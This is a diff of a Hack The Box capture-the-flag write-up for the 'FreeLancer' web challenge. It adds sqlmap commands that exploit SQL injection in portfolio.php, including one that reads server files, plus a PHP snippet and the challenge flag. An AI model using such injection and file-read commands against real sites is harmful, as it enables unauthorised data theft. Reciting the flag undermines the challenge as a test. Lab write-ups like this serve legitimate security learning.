@@ -1,6 +1,9 @@
 ## FreeLancer ##
 
+OWASP Scan Result:
 ![OWASP](https://github.com/SagiUziel/HackTheBox/blob/master/Web/FreeLancer/ZAP.JPG)
+
+portfolio.php - Parameter 'id' might be injectable:
 
 ```
 > python .\sqlmap.py -u "http://docker.hackthebox.eu:30418/portfolio.php?id=1" -p id --tables
@@ -86,6 +89,7 @@ DOWNLOADED: 13836 - FOUND: 6
 
 ```
 
+http://docker.hackthebox.eu:30707/administrat/index.php:
 
 
 ```
@@ -215,6 +219,11 @@ if($_SERVER["REQUEST_METHOD"] == "POST"){
 </html>
 ```
 
+// Redirect user to welcome page
+header("location: panel.php");
+
+
+panel.php:
 ```
 >  python3 sqlmap.py -u http://docker.hackthebox.eu:30866/portfolio.php?id=1 --file-read /var/www/html/administrat/panel.php
 ```
@@ -252,3 +261,5 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
 </body>
 </html>
 ```
+
+HTB{s4ff_3_1_w33b_fr4__l33nc_3}
